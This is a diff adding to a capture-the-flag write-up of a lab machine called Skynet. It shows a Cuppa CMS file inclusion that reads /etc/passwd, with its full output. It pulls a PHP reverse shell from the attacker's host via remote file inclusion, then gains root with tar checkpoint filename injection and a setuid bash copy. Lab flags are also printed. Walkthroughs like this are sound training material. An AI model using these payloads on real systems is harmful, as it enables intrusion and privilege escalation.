@@ -194,3 +194,84 @@ in /notes is `important.txt`
 2. Work on T-800 Model 101 blueprints
 3. Spend more time with my wife
 ```
+
+On `http://10.10.249.109/45kra24zxs28v3yd/administrator/` is `Cuppa CMS`
+http://10.10.249.109/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd
+```
+cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKbHhkOng6MTA2OjY1NTM0OjovdmFyL2xpYi9seGQvOi9iaW4vZmFsc2UKbWVzc2FnZWJ1czp4OjEwNzoxMTE6Oi92YXIvcnVuL2RidXM6L2Jpbi9mYWxzZQp1dWlkZDp4OjEwODoxMTI6Oi9ydW4vdXVpZGQ6L2Jpbi9mYWxzZQpkbnNtYXNxOng6MTA5OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovYmluL2ZhbHNlCnNzaGQ6eDoxMTA6NjU1MzQ6Oi92YXIvcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4KbWlsZXNkeXNvbjp4OjEwMDE6MTAwMTosLCw6L2hvbWUvbWlsZXNkeXNvbjovYmluL2Jhc2gKZG92ZWNvdDp4OjExMToxMTk6RG92ZWNvdCBtYWlsIHNlcnZlciwsLDovdXNyL2xpYi9kb3ZlY290Oi9iaW4vZmFsc2UKZG92ZW51bGw6eDoxMTI6MTIwOkRvdmVjb3QgbG9naW4gdXNlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwb3N0Zml4Ong6MTEzOjEyMTo6L3Zhci9zcG9vbC9wb3N0Zml4Oi9iaW4vZmFsc2UKbXlzcWw6eDoxMTQ6MTIzOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQo=
+```
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
+dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
+postfix:x:113:121::/var/spool/postfix:/bin/false
+mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+So we can read files on the target machine, but now I need a foothold.
+
+I ran `sudo python3 -m http.server 80` so that way I can pull my reverse shell php files from my machine. Next I used `http://10.10.249.109/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.248.108/reverse-shell.php`
+to get a reverse shell. Then in `/home/milesdyson` was user.txt.
+```
+7ce5c2109a40f958099283600a9ae807
+```
+
+Now I need to privesc. I uploaded linpeas to the target machine to help with enumeration.
+
+No dice with linpeas. Got stuck and had to consult walkthrough
+
+trist.sh
+```
+#!/bin/bash
+cp /bin/bash /tmp/trist && chmod +s /tmp/trist
+```
+
+```
+touch "/var/www/html/--checkpoint-action=exec=sh trist.sh"
+touch "/var/www/html/--checkpoint=1"
+```
+
+```
+www-data@skynet:/var/www/html$ ls -la /tmp
+-rwsr-sr-x  1 root     root     1037528 Jun  8 14:11 trist
+```
+
+```
+www-data@skynet:/tmp$ /tmp/trist -p
+trist-4.3# whoami
+root
+
+```
+
+root.txt
+`3f0372db24753accc7179a282cd6a949`
